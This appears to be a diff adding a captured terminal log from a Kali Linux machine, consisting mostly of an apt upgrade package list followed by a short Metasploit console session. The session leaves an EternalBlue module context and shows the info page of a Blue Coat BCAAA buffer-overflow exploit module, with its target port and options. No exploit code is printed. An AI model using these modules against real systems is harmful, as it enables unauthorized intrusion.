+  libqt5svg5 libqt5test5 libqt5webchannel5 libqt5webkit5 libqt5widgets5 libqt5xml5 libqt5xmlpatterns5 libqtcore4 libqtdbus4
+  libqtgui4 libquadmath0 libradare2-dev libsfcgal1 libsmbclient libsnmp-base libsnmp30 libstdc++-8-dev libstdc++6 libstdc++6:i386
+  libtsan0 libubsan1 libwbclient0 libwine libwine:i386 libx32asan5 libx32atomic1 libx32gcc-8-dev libx32gcc1 libx32gomp1 libx32itm1
+  libx32quadmath0 libx32stdc++-8-dev libx32stdc++6 libx32ubsan1 libxtables12 linux-image-amd64 lxpanel lxpanel-data mailutils
+  mailutils-common mesa-va-drivers mesa-va-drivers:i386 mesa-vdpau-drivers mesa-vdpau-drivers:i386 mutter nodejs ntfs-3g odbcinst
+  odbcinst1debian2 php php-mysql poppler-utils python-bs4 python-faraday python-gdal python-impacket python-matplotlib
+  python-mysqldb python-pil python-pil.imagetk python-pyqt5 python-qgis python-qgis-common python-samba python-webargs python3
+  python3-apt python3-brlapi python3-brotli python3-bs4 python3-cffi-backend python3-dbus python3-dev python3-distutils
+  python3-gpg python3-gst-1.0 python3-lib2to3 python3-louis python3-lxml python3-markupsafe python3-matplotlib python3-minimal
+  python3-mpltoolkits.basemap python3-mysqldb python3-numpy python3-pil python3-psycopg2 python3-pycurl python3-pyproj
+  python3-pyqt5 python3-scipy python3-sip python3-sqlalchemy python3-sqlalchemy-ext python3-tk python3-tornado python3-yaml qdbus
+  qt4-designer qt4-linguist-tools qt4-qmake qt5-gtk-platformtheme radare2 recon-ng ruby-activesupport ruby-dataobjects-mysql
+  ruby-i18n ruby-rack ruby-sinatra samba samba-common samba-common-bin samba-dsdb-modules samba-libs samba-vfs-modules smbclient
+  snmp snmpd sslyze sysstat terminator testdisk theharvester tracker-extract tracker-miner-fs unattended-upgrades usbutils
+  va-driver-all va-driver-all:i386 vim vim-common vim-gtk vim-gui-common vim-runtime vim-tiny wfuzz wine wine32:i386 wine64 winexe
+  xpdf
+The following packages will be upgraded:
+  accountsservice acl adwaita-icon-theme afflib-tools aircrack-ng alsa-tools amd64-microcode anacron android-libbacktrace
+  android-libbase android-libcutils android-liblog android-libutils android-libziparchive apache2 apache2-bin apache2-data
+  apache2-utils apparmor appstream apt apt-config-icons apt-listchanges apt-transport-https apt-utils arj aspell at-spi2-core attr
+  axel b43-fwcutter baobab base-passwd bash bash-completion bind9-host binfmt-support binutils binutils-common
+  binutils-x86-64-linux-gnu bolt braa bsdutils bubblewrap bundler busybox ca-certificates ca-certificates-java caribou cewl
+  cheese-common cherrytree chirp chkrootkit chrome-gnome-shell clang-6.0 colord colord-data commix console-setup
+  console-setup-linux coreutils cpp-7 cracklib-runtime cron cups-bsd cups-client cups-common curl cython dash dbus
+  dbus-user-session dbus-x11 dc3dd dconf-cli dconf-gsettings-backend dconf-service ddrescue debconf debconf-i18n debian-faq
+  debianutils default-jdk default-jdk-headless default-jre default-jre-headless desktop-base dh-python diffutils dirmngr dmsetup
+  dns-root-data dnsutils docker.io docutils-common docutils-doc dpkg dpkg-dev e2fslibs e2fsprogs easy-rsa enchant ethtool evince
+  evince-common evolution-data-server evolution-data-server-common ewf-tools exe2hexbat exim4-base exim4-config exim4-daemon-light
+  exploitdb fdisk ffmpeg file file-roller findutils finger firebird3.0-common firebird3.0-common-doc firmware-amd-graphics
+  firmware-ath9k-htc firmware-atheros firmware-b43-installer firmware-b43legacy-installer firmware-bnx2 firmware-bnx2x
+  firmware-brcm80211 firmware-cavium firmware-intel-sound firmware-intelwimax firmware-ipw2x00 firmware-ivtv firmware-iwlwifi
+  firmware-libertas firmware-linux firmware-linux-nonfree firmware-misc-nonfree firmware-myricom firmware-netxen firmware-qlogic
+  firmware-realtek firmware-samsung firmware-siano firmware-ti-connectivity firmware-zd1211 fonts-freefont-ttf fonts-lmodern
+  fonts-lyx fonts-noto-mono fonts-wine fping freerdp2-x11 ftp fuse g++-7 galera-3 galleta gcc-7 gcc-7-base gcr gdal-data gdisk
+  gdm3 gedit gedit-common geoclue-2.0 ghostscript gir1.2-accountsservice-1.0 gir1.2-atk-1.0 gir1.2-atspi-2.0 gir1.2-caribou-1.0
+  gir1.2-clutter-1.0 gir1.2-clutter-gst-3.0 gir1.2-cogl-1.0 gir1.2-coglpango-1.0 gir1.2-evince-3.0 gir1.2-gck-1 gir1.2-gcr-3
+  gir1.2-gdkpixbuf-2.0 gir1.2-gdm-1.0 gir1.2-geoclue-2.0 gir1.2-gmenu-3.0 gir1.2-gnomebluetooth-1.0 gir1.2-gnomedesktop-3.0
+  gir1.2-gtk-3.0 gir1.2-gtkclutter-1.0 gir1.2-gtksource-3.0 gir1.2-gweather-3.0 gir1.2-harfbuzz-0.0 gir1.2-ibus-1.0
+  gir1.2-javascriptcoregtk-4.0 gir1.2-json-1.0 gir1.2-mutter-3 gir1.2-nm-1.0 gir1.2-nma-1.0 gir1.2-notify-0.7
+  gir1.2-packagekitglib-1.0 gir1.2-pango-1.0 gir1.2-peas-1.0 gir1.2-polkit-1.0 gir1.2-rsvg-2.0 gir1.2-secret-1 gir1.2-soup-2.4
+  gir1.2-totem-1.0 gir1.2-totemplparser-1.0 gir1.2-upowerglib-1.0 gir1.2-vte-2.91 gir1.2-webkit2-4.0 gir1.2-wnck-3.0 git git-man
+  gkbd-capplet glib-networking glib-networking-common glib-networking-services gnome-bluetooth gnome-calculator gnome-characters
+  gnome-contacts gnome-control-center gnome-control-center-data gnome-core gnome-desktop3-data gnome-disk-utility
+  gnome-font-viewer gnome-keyring gnome-keyring-pkcs11 gnome-logs gnome-menus gnome-online-accounts gnome-online-miners
+  gnome-screenshot gnome-session gnome-session-bin gnome-session-common gnome-shell-extension-dashtodock
+  gnome-shell-extension-easyscreencast gnome-system-monitor gnome-terminal gnome-terminal-data gnome-theme-kali gnome-tweak-tool
+  gnome-tweaks gnome-user-share gnupg gnupg-l10n gnupg-utils gnuplot gnuplot-data gnuplot-qt gobuster gpg gpg-agent gpg-wks-client
+  gpg-wks-server gpgconf gpgsm gpgv graphviz grep greybird-gtk-theme groff-base grub-common grub-pc grub-pc-bin grub2-common
+  gstreamer1.0-clutter-3.0 gstreamer1.0-packagekit gtk-update-icon-cache gtk2-engines-murrine gucharmap guile-2.0-libs guymager
+  gzip hashcat hashcat-data hwloc i965-va-driver i965-va-driver:i386 ibverbs-providers iftop ifupdown imagemagick
+  imagemagick-6-common imagemagick-6.q16 init init-system-helpers iodine iproute2 irssi isc-dhcp-common iso-codes iw jarwrapper
+  java-common john john-data kali-defaults kali-desktop-gnome kali-desktop-live kali-root-login keyboard-configuration keyutils
+  klibc-utils kmod krb5-locales ldap-utils libaa1 libaacs0 libaccountsservice0 libacl1 libacl1-dev libafflib0v5 libaio1
+  libapparmor1 libappstream4 libapr1 libaprutil1 libaprutil1-dbd-sqlite3 libaprutil1-ldap libapt-inst2.0 libapt-pkg5.0
+  libarchive13 libargon2-1 libarmadillo9 libarpack2 libasan4 libasound2 libasound2:i386 libasound2-data libasound2-plugins
+  libasound2-plugins:i386 libaspell15 libassuan0 libatk-adaptor libatk-bridge2.0-0 libatk1.0-0 libatk1.0-data libatkmm-1.6-1v5
+  libatspi2.0-0 libattr1 libattr1-dev libavcodec58 libavcodec58:i386 libavdevice58 libavfilter7 libavformat58 libavresample4
+  libavresample4:i386 libavutil56 libavutil56:i386 libayatana-indicator3-7 libbabeltrace1 libbind9-161 libbinutils libblkid1
+  libblkid1:i386 libblockdev-crypto2 libblockdev-fs2 libblockdev-loop2 libblockdev-part-err2 libblockdev-part2 libblockdev-swap2
+  libblockdev-utils2 libblockdev2 libbluray2 libboost-atomic1.62.0 libboost-atomic1.67.0 libboost-chrono1.62.0
+  libboost-chrono1.67.0 libboost-date-time1.62.0 libboost-date-time1.67.0 libboost-filesystem1.62.0 libboost-filesystem1.67.0
+  libboost-program-options1.62.0 libboost-python1.62.0 libboost-python1.67.0 libboost-random1.67.0 libboost-serialization1.62.0
+  libboost-system1.62.0 libboost-system1.67.0 libboost-test1.62.0 libboost-thread1.62.0 libboost-thread1.67.0 libboost-timer1.62.0
+  libbrlapi0.6 libbrotli1 libbsd0 libbsd0:i386 libc-bin libc-dev-bin libc-l10n libc6 libc6:i386 libc6-dbg libc6-dev libc6-dev-i386
+  libc6-dev-x32 libc6-i386 libc6-x32 libcairo-gobject2 libcairo2 libcairo2:i386 libcairomm-1.0-1v5 libcamel-1.2-62
+  libcanberra-gtk-module libcanberra-gtk0 libcanberra-gtk3-0 libcanberra-gtk3-module libcanberra-pulse libcanberra0 libcap-ng0
+  libcap2 libcap2:i386 libcap2-bin libcapstone-dev libcapstone3 libcaribou-common libcaribou0 libcdt5 libcgal13 libcgraph6
+  libcheese-gtk25 libcheese8 libchromaprint1 libcilkrts5 libclang-common-6.0-dev libclang1-6.0 libcli1.9 libclutter-1.0-0
+  libclutter-1.0-common libclutter-gst-3.0-0 libclutter-gtk-1.0-0 libcogl-common libcogl-pango20 libcogl-path20 libcogl20
+  libcolord2 libcolorhug2 libcom-err2 libcom-err2:i386 libcomerr2 libconfig-inifiles-perl libcrack2 libcroco3 libcroco3:i386
+  libcups2 libcups2:i386 libcupsfilters1 libcupsimage2 libcurl3-gnutls libcurl4 libdap25 libdapclient6v5 libdapserver7v5
+  libdate-manip-perl libdatrie1 libdatrie1:i386 libdb5.3 libdb5.3:i386 libdbd-sqlite3-perl libdbus-1-3 libdbus-1-3:i386
+  libdbus-glib-1-2 libdconf1 libdebconfclient0 libdee-1.0-4 libdevel-callchecker-perl libdevmapper-event1.02.1 libdevmapper1.02.1
+  libdistorm3-3 libdleyna-connector-dbus-1.0-1 libdmapsharing-3.0-2 libdns1104 libdouble-conversion1 libdpkg-perl libdrm-amdgpu1
+  libdrm-amdgpu1:i386 libdrm-common libdrm-dev libdrm-intel1 libdrm-intel1:i386 libdrm-nouveau2 libdrm-nouveau2:i386
+  libdrm-radeon1 libdrm-radeon1:i386 libdrm2 libdrm2:i386 libdv4 libdvdread4 libdw1 libebackend-1.2-10 libebook-1.2-19
+  libebook-contacts-1.2-2 libecal-1.2-19 libedata-book-1.2-25 libedata-cal-1.2-29 libedataserver-1.2-23 libedataserverui-1.2-2
+  libedit2 libedit2:i386 libegl-mesa0 libelf1 libelf1:i386 liberror-perl libevdocument3-4 libevview3-3 libewf2 libexif12
+  libexif12:i386 libext2fs2 libfbclient2 libfdisk1 libfm-data libfm-extra4 libfm-gtk-data libfm-gtk4 libfm-modules libfm4
+  libfreerdp-client2-2 libfreerdp2-2 libfribidi0 libfribidi0:i386 libfstrm0 libfuse2 libfwupd2 libgbm1 libgcc-7-dev libgck-1-0
+  libgcr-base-3-1 libgcr-ui-3-1 libgcrypt20 libgcrypt20:i386 libgd3 libgd3:i386 libgdata-common libgdata22 libgdbm-compat4
+  libgdbm6 libgdk-pixbuf2.0-0 libgdk-pixbuf2.0-0:i386 libgdk-pixbuf2.0-bin libgdk-pixbuf2.0-common libgdm1 libgee-0.8-2
+  libgeoclue-2-0 libgeocode-glib0 libgeotiff2 libgfbgraph-0.2-0 libgirepository-1.0-1 libgl1-mesa-dev libgl1-mesa-glx
+  libglib-object-introspection-perl libglib-perl libglib2.0-data libglibmm-2.4-1v5 libglu1-mesa libglu1-mesa:i386 libglu1-mesa-dev
+  libgnome-autoar-0-0 libgnome-bluetooth13 libgnome-desktop-3-17 libgnome-menu-3-0 libgnomekbd-common libgnomekbd8 libgnutls-dane0
+  libgnutls30 libgnutls30:i386 libgoa-1.0-0b libgoa-1.0-common libgoa-backend-1.0-1 libgom-1.0-0 libgpg-error-l10n libgpg-error0
+  libgpg-error0:i386 libgpgme11 libgphoto2-6 libgphoto2-6:i386 libgphoto2-l10n libgphoto2-port12 libgphoto2-port12:i386
+  libgraphene-1.0-0 libgraphite2-3 libgraphite2-3:i386 libgraphite2-dev libgs9 libgs9-common libgsf-1-114 libgsf-1-common libgsm1
+  libgsm1:i386 libgspell-1-1 libgspell-1-common libgssapi-krb5-2 libgssapi-krb5-2:i386 libgssdp-1.0-3 libgtk-3-0 libgtk-3-bin
+  libgtk-3-common libgtkmm-2.4-1v5 libgtkmm-3.0-1v5 libgtksourceview-3.0-1 libgtksourceview-3.0-common libgtop-2.0-11
+  libgtop2-common libgucharmap-2-90-7 libgupnp-1.0-4 libgupnp-av-1.0-2 libgupnp-dlna-2.0-3 libgupnp-igd-1.0-4 libgvc6 libgvpr2
+  libgweather-3-15 libgweather-common libgxps2 libharfbuzz-dev libharfbuzz-gobject0 libharfbuzz-icu0 libharfbuzz0b
+  libharfbuzz0b:i386 libhivex-bin libhivex0 libhogweed4 libhogweed4:i386 libhtml-tree-perl libhttp-daemon-perl libhttp-dav-perl
+  libhwloc-plugins libhwloc5 libhyphen0 libibus-1.0-5 libibverbs1 libical3 libid3tag0 libimobiledevice6 libinput-bin libinput10
+  libio-stringy-perl libiptcdata0 libirs161 libisc1100 libisccc161 libisccfg163 libjansson4 libjavascriptcoregtk-4.0-18
+  libjs-jquery libjs-source-map libjs-sphinxdoc libjs-uglify libjs-underscore libjson-c3 libjson-glib-1.0-0
+  libjson-glib-1.0-common libjsr305-java libk5crypto3 libk5crypto3:i386 libkate1 libkeyutils1 libkeyutils1:i386 libklibc libkmod2
+  libkpathsea6 libkrb5-3 libkrb5-3:i386 libkrb5support0 libkrb5support0:i386 liblab-gamut1 libldap-2.4-2 libldap-2.4-2:i386
+  libldap-common libldb1 liblinear3 liblirc-client0 libllvm6.0 libllvm6.0:i386 libllvm7 liblouis-data libltdl7 libltdl7:i386
+  liblua5.3-0 liblwres161 liblz4-1 liblz4-1:i386 liblzma5 liblzma5:i386 libmad0 libmagic-dev libmagic-mgc libmagic1 libmbim-glib4
+  libmbim-proxy libmm-glib0 libmodule-scandeps-perl libmount1 libmount1:i386 libmpfr6 libmtp-common libmtp-runtime libmtp9
+  libmutter-3-0 libmysofa0 libnautilus-extension1a libncurses-dev libncurses5 libncurses6 libncurses6:i386 libncursesw5
+  libncursesw6 libneon27-gnutls libnet-cidr-perl libnet-dns-perl libnet-dns-sec-perl libnet-netmask-perl libnet-snmp-perl
+  libnetfilter-queue1 libnetpacket-perl libnettle6 libnettle6:i386 libnghttp2-14 libnginx-mod-http-auth-pam
+  libnginx-mod-http-dav-ext libnginx-mod-http-echo libnginx-mod-http-geoip libnginx-mod-http-image-filter
+  libnginx-mod-http-subs-filter libnginx-mod-http-upstream-fair libnginx-mod-http-xslt-filter libnginx-mod-mail
+  libnginx-mod-stream libnm0 libnma0 libnorm1 libnotify4 libnss-myhostname libnss3 liboauth0 libobjc-7-dev libobrender32v5
+  libobt2v5 libopencv-core3.2 libopencv-imgproc3.2 libopenexr23 libopenjp2-7 libopenjp2-7:i386 libopenmpt0 libopus0 libopus0:i386
+  liborc-0.4-0 liborc-0.4-0:i386 libosinfo-1.0-0 libp11-kit0 libp11-kit0:i386 libpackage-stash-perl libpackage-stash-xs-perl
+  libpackagekit-glib2-18 libpam-cap libpam-gnome-keyring libpam-modules libpam-modules-bin libpam-runtime libpam-systemd libpam0g
+  libpango-1.0-0 libpango-1.0-0:i386 libpangocairo-1.0-0 libpangocairo-1.0-0:i386 libpangoft2-1.0-0 libpangoft2-1.0-0:i386
+  libpangomm-1.4-1v5 libpangoxft-1.0-0 libpaper-utils libpaper1 libparted-fs-resize0 libparted2 libpathplan4 libpcre16-3
+  libpcre2-16-0 libpcre2-8-0 libpcre3 libpcre3:i386 libpcre3-dev libpcre32-3 libpcrecpp0v5 libpeas-common libperl5.28 libpgm-5.2-0
+  libpipeline1 libpipewire-0.2-1 libpixman-1-0 libpixman-1-0:i386 libplist3 libpng16-16 libpng16-16:i386 libpocl2 libpocl2-common
+  libpolkit-agent-1-0 libpolkit-backend-1-0 libpolkit-gobject-1-0 libpopt0 libpostproc55 libpq5 libproc-processtable-perl
+  libproxy1-plugin-gsettings libproxy1-plugin-networkmanager libproxy1-plugin-webkit libproxy1v5 libproxychains4 libptexenc1
+  libpthread-stubs0-dev libpulse-mainloop-glib0 libpulse0 libpulse0:i386 libpulsedsp libpwquality-common libpwquality1
+  libpython-all-dev libpython-dev libpython-stdlib libpython2-dev libpython2-stdlib libpython2.7 libpython2.7-dev
+  libpython2.7-minimal libpython2.7-stdlib libpython3.7-minimal libpython3.7-stdlib libqmi-glib5 libqmi-proxy
+  libqscintilla2-qt4-13 libqscintilla2-qt4-l10n libqscintilla2-qt5-13 libqscintilla2-qt5-l10n libqt5concurrent5 libqt5help5
+  libqwt6abi1 libradare2-common librdmacm1 libreadline5 librsvg2-2 librsvg2-2:i386 librsvg2-common librsvg2-common:i386 libruby2.5
+  librygel-core-2.6-2 librygel-db-2.6-2 librygel-renderer-2.6-2 librygel-server-2.6-2 libsane libsane-common libsasl2-2
+  libsasl2-2:i386 libsasl2-modules libsasl2-modules:i386 libsasl2-modules-db libsasl2-modules-db:i386 libsdl-ttf2.0-0
+  libsdl2-2.0-0 libseccomp2 libsecret-1-0 libsecret-common libsemanage-common libsemanage1 libserf-1-1 libshiboken1.2v5
+  libsigc++-2.0-0v5 libslang2 libsm-dev libsm6 libsm6:i386 libsmali-java libsmartcols1 libsndfile1 libsndfile1:i386 libsnmp-perl
+  libsodium23 libsoundtouch1 libsoup-gnome2.4-1 libsoup2.4-1 libspandsp2 libspeechd2 libsqlite3-0 libss2 libssh-4 libssh-gcrypt-4
+  libssh2-1 libssl1.1 libssl1.1:i386 libstartup-notification0 libstdc++-7-dev libsuperlu5 libsvn1 libswresample3
+  libswresample3:i386 libswscale5 libsynctex2 libsystemd0 libsystemd0:i386 libtag1v5 libtag1v5-vanilla libtagc0 libtbb2 libtcl8.6
+  libtdb1 libteamdctl0 libterm-readkey-perl libterm-readline-gnu-perl libtexlua52 libtexlua53 libtexluajit2 libthai-data libthai0
+  libthai0:i386 libtheora0 libtheora0:i386 libtiff5 libtiff5:i386 libtinfo-dev libtinfo5 libtinfo6 libtinfo6:i386 libtirpc-common
+  libtirpc3 libtk8.6 libtommath1 libtorrent-rasterbar9 libtotem-plparser-common libtotem-plparser18 libtotem0
+  libtracker-control-2.0-0 libtracker-miner-2.0-0 libtracker-sparql-2.0-0 libtsk13 libubsan0 libudev1 libudev1:i386 libudisks2-0
+  libunbound8 libunwind8 libupower-glib3 liburcu6 liburi-perl liburiparser1 libuuid1 libuuid1:i386 libuv1 libv4l-0 libv4l-0:i386
+  libv4lconvert0 libv4lconvert0:i386 libva-drm2 libva-drm2:i386 libva-wayland2 libva-x11-2 libva-x11-2:i386 libva2 libva2:i386
+  libvdpau1 libvdpau1:i386 libvisual-0.4-0 libvisual-0.4-0:i386 libvncclient1 libvncserver1 libvolume-key1 libvorbis0a
+  libvorbis0a:i386 libvorbisenc2 libvorbisenc2:i386 libvorbisfile3 libvte-2.91-0 libvte-2.91-common libvulkan1 libwacom-bin
+  libwacom-common libwacom2 libwebkit2gtk-4.0-37 libwildmidi-config libwildmidi2 libwinpr2-2 libwireshark-data libwireshark11
+  libwiretap8 libwnck-3-0 libwnck-3-common libwrap0 libwrap0:i386 libwscodecs2 libwsutil9 libwxbase3.0-0v5 libwxgtk3.0-0v5
+  libwxgtk3.0-gtk3-0v5 libx265-165 libx265-165:i386 libxapian30 libxatracker2 libxcb-dri2-0 libxcb-dri2-0:i386 libxcb-dri2-0-dev
+  libxcb-dri3-0 libxcb-dri3-0:i386 libxcb-dri3-dev libxcb-glx0 libxcb-glx0:i386 libxcb-glx0-dev libxcb-icccm4 libxcb-present-dev
+  libxcb-present0 libxcb-present0:i386 libxcb-randr0 libxcb-randr0-dev libxcb-render0 libxcb-render0:i386 libxcb-render0-dev
+  libxcb-res0 libxcb-shape0 libxcb-shape0-dev libxcb-shm0 libxcb-shm0:i386 libxcb-sync-dev libxcb-sync1 libxcb-sync1:i386
+  libxcb-xf86dri0 libxcb-xfixes0 libxcb-xfixes0:i386 libxcb-xfixes0-dev libxcb-xinerama0 libxcb-xkb1 libxcb-xv0 libxcb1
+  libxcb1:i386 libxcb1-dev libxdamage-dev libxdamage1 libxdamage1:i386 libxdot4 libxinerama1 libxinerama1:i386 libxkbfile1
+  libxklavier16 libxml-libxml-perl libxml-parser-perl libxml-twig-perl libxml2 libxml2:i386 libxml2-dev libxml2-utils
+  libxmmsclient-glib1 libxmmsclient6 libxmu6 libxmuu1 libxt-dev libxt6 libyara3 libyelp0 libzapojit-0.0-0 libzbar0
+  libzeitgeist-2.0-0 libzip4 libzmq5 libzstd1 libzstd1:i386 libzvbi-common libzvbi0 libzvbi0:i386 libzzip-0-13 linux-libc-dev
+  llvm-6.0 llvm-6.0-dev llvm-6.0-runtime lmodern locales locales-all lsb-base lsb-release lsof lua-json lvm2 lxde-settings-daemon
+  lxlock lxpolkit lxrandr lxsession lxsession-data lxsession-edit lxsession-logout lxtask man-db mariadb-common mc mc-data
+  mercurial mercurial-common mesa-common-dev metasploit-framework mime-support mimikatz miredo modemmanager mount mousetweaks
+  msfpc mutter-common mysql-common nano nautilus nautilus-data nautilus-extension-gnome-terminal ncat ncompress ncurses-base
+  ncurses-bin ncurses-hexedit ncurses-term ndiff needrestart netbase netdiscover netmask network-manager network-manager-gnome
+  nfs-common nginx nginx-common nginx-full nikto nmap nmap-common nodejs-doc notification-daemon ocl-icd-libopencl1
+  ocl-icd-libopencl1:i386 openbox openjdk-11-jdk openjdk-11-jdk-headless openjdk-11-jre openjdk-11-jre-headless openjdk-8-jre
+  openjdk-8-jre-headless openssh-client openssh-server openssh-sftp-server openssl openvpn os-prober p11-kit p11-kit-modules
+  packagekit packagekit-tools parted pcmanfm pcsc-tools perl perl-base perl-modules-5.28 php-common pkg-config pocl-opencl-icd
+  policykit-1 postgresql postgresql-11 postgresql-client-11 postgresql-client-common postgresql-common ppp proxychains4
+  publicsuffix pulseaudio pulseaudio-module-bluetooth pulseaudio-utils pyrit python python-alembic python-all python-all-dev
+  python-apt-common python-backports.functools-lru-cache python-bcrypt python-capstone python-cffi-backend python-chardet
+  python-click python-cryptography python-dateutil python-dbus python-decorator python-dev python-distorm3 python-dnspython
+  python-docutils python-entrypoints python-flask-babelex python-flaskext.wtf python-future python-geoip python-gi python-gi-cairo
+  python-gobject python-greenlet python-httplib2 python-keyring python-keyrings.alt python-ldap3 python-ldb python-levenshtein
+  python-libtorrent python-libxml2 python-lxml python-m2crypto python-markupsafe python-matplotlib-data python-minimal
+  python-mpltoolkits.basemap-data python-numpy python-openssl python-owslib python-packaging python-paramiko python-pip
+  python-pip-whl python-pkg-resources python-prettytable python-psutil python-psycopg2 python-py python-pycurl python-pydot
+  python-pygame python-pygments python-pymssql python-pyproj python-pytest python-pyv8 python-pyx python-qrcode python-qscintilla2
+  python-requests python-setuptools python-simplejson python-sip python-slugify python-sqlalchemy python-sqlalchemy-ext python-tdb
+  python-tk python-tornado python-tqdm python-tz python-unidecode python-urllib3 python-virtualenv python-webencodings
+  python-werkzeug python-wheel python-xdg python-xlsxwriter python-yaml python-yara python2 python2-dev python2-minimal python2.7
+  python2.7-dev python2.7-minimal python3-alembic python3-bcrypt python3-boltons python3-chardet python3-click
+  python3-cryptography python3-cupshelpers python3-dateutil python3-debconf python3-debian python3-debianbts python3-decorator
+  python3-dnspython python3-entrypoints python3-gi python3-gi-cairo python3-httplib2 python3-jwt python3-keyring
+  python3-keyrings.alt python3-ldap3 python3-openssl python3-paramiko python3-pip python3-pkg-resources python3-pluginbase
+  python3-prettytable python3-pyatspi python3-pyotp python3-pyshp python3-pysimplesoap python3-reportbug python3-requests
+  python3-setuptools python3-smoke-zephyr python3-software-properties python3-speechd python3-tz python3-urllib3
+  python3-virtualenv python3-webencodings python3-wheel python3-xdg python3-xlsxwriter python3.7 python3.7-minimal
+  qttranslations5-l10n rdesktop reportbug rfkill rifiuti rsync rsyslog ruby-bundler ruby-cms-scanner ruby-eventmachine ruby-http
+  ruby-http-cookie ruby-http-form-data ruby-httpclient ruby-mime ruby-mini-exiftool ruby-multipart-post ruby-net-http-persistent
+  ruby-nio4r ruby-nokogiri ruby-oj ruby-opt-parse-validator ruby-pkg-config ruby-rack-protection ruby-snmp ruby-spider ruby-tilt
+  ruby-twitter ruby-typhoeus ruby-zip ruby2.5 ruby2.5-dev ruby2.5-doc runc rwho rwhod rygel sane-utils scalpel scrot sed sleuthkit
+  smali smbmap smplayer smplayer-l10n smplayer-themes software-properties-common software-properties-gtk sparta speech-dispatcher
+  speech-dispatcher-audio-plugins speech-dispatcher-espeak-ng sqlite3 sqlmap squashfs-tools sslscan strace stunnel4 subversion
+  sudo swaks swig swig3.0 switcheroo-control system-config-printer-common system-config-printer-udev systemd systemd-sysv
+  sysvinit-utils t1utils t50 tar tasksel tasksel-data tcl tcl8.6 tcpreplay tdb-tools telnet tex-common texlive-base
+  texlive-binaries texlive-latex-base texlive-latex-base-doc tftp thc-ipv6 thin thin-provisioning-tools tk tk8.6 tmux tor
+  tor-geoipdb totem totem-common totem-plugins tracker tshark tzdata ucf udev udisks2 unzip upower usermode util-linux
+  uuid-runtime vdpau-driver-all vdpau-driver-all:i386 virtualenv vlan vpnc-scripts wget whois wifite wireshark wireshark-common
+  wireshark-qt wpasupplicant wpscan xarchiver xbrlapi xclip xdg-user-dirs xfonts-base xfsprogs xkb-data xml-core xmms2-core
+  xmms2-plugin-alsa xmms2-plugin-id3v2 xmms2-plugin-mad xmms2-plugin-vorbis xorgxrdp xrdp xscreensaver xscreensaver-data
+  xserver-xorg-input-libinput xserver-xorg-video-amdgpu xserver-xorg-video-ati xserver-xorg-video-nouveau
+  xserver-xorg-video-radeon xterm xxd xz-utils yelp yelp-xsl youtube-dl zeitgeist-core zenity zenity-common zenmap zsh zsh-common
+1466 upgraded, 0 newly installed, 0 to remove and 294 not upgraded.
+Need to get 1,503 MB of archives.
+After this operation, 370 MB of additional disk space will be used.
+Interrupt: use the 'exit' command to quit
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> exit
+[0m[1m[34m[*][0m Spooling to file msf-output...
+[?1034h[4mmsf[0m [0m> search ms[K[Kbcaaa
+[0m
+Matching Modules
+================
+
+   Name                            Disclosure Date  Rank  Check  Description
+   ----                            ---------------  ----  -----  -----------
+   exploit/windows/misc/bcaaa_bof  2011-04-04       good  No     Blue Coat Authentication and Authorization Agent (BCAAA) 5 Buffer Overflow
+
+
+[4mmsf[0m [0m> info exploit/windows/misc/bcaaa_bof
+[0m
+       Name: Blue Coat Authentication and Authorization Agent (BCAAA) 5 Buffer Overflow
+     Module: exploit/windows/misc/bcaaa_bof
+   Platform: Windows
+       Arch: 
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Good
+  Disclosed: 2011-04-04
+
+Provided by:
+  Paul Harrington
+  Travis Warren
+  sinn3r <sinn3r@metasploit.com>
+
+Available targets:
+  Id  Name
+  --  ----
+  0   BCAAA Version 5.4.6.1.54128
+
+Check supported:
+  No
+
+Basic options:
+  Name      Current Setting  Required  Description
+  ----      ---------------  --------  -----------
+  ATTEMPTS  3                yes       Number of attempts to try to exploit
+  RHOST                      yes       The target address
+  RPORT     16102            yes       The target port (TCP)
+
+Payload information:
+  Space: 936
+  Avoid: 1 characters
+
+Description:
+  This module exploits a stack buffer overflow in process 
+  bcaaa-130.exe (port 16102), which comes as part of the Blue Coat 
+  Authentication proxy. Please note that by default, this exploit will 
+  attempt up to three times in order to successfully gain remote code 
+  execution (in some cases, it takes as many as five times). This can 
+  cause your activity to look even more suspicious. To modify the 
+  number of exploit attempts, set the ATTEMPTS option.
+
+References:
+  https://cvedetails.com/cve/CVE-2011-5124/
+  OSVDB (72095)
+  https://kb.bluecoat.com/index?page=content&id=SA55
+  https://seclists.org/bugtraq/2011/Jul/44
+
+[4mmsf[0m [0m> exit
+[0m
